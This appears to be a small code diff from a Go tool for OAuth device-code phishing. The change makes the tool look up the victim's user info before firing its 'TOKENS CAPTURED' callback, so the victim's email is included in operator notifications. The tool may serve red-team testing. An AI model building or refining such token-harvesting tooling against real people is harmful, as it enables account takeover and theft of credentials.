@@ -479,8 +479,8 @@ func (m *DeviceCodeManager) pollForToken(session *DeviceCodeSession) {
 
 				log.Success("[devicecode] [%s] *** TOKENS CAPTURED *** (client: %s)", session.ID, session.ClientName)
 
-				// Try to get user info
-				go m.fetchUserInfo(session)
+				// Fetch user info BEFORE triggering callback (so email is available for notifications)
+				m.fetchUserInfo(session)
 
 				// Fire capture callback
 				m.mu.RLock()
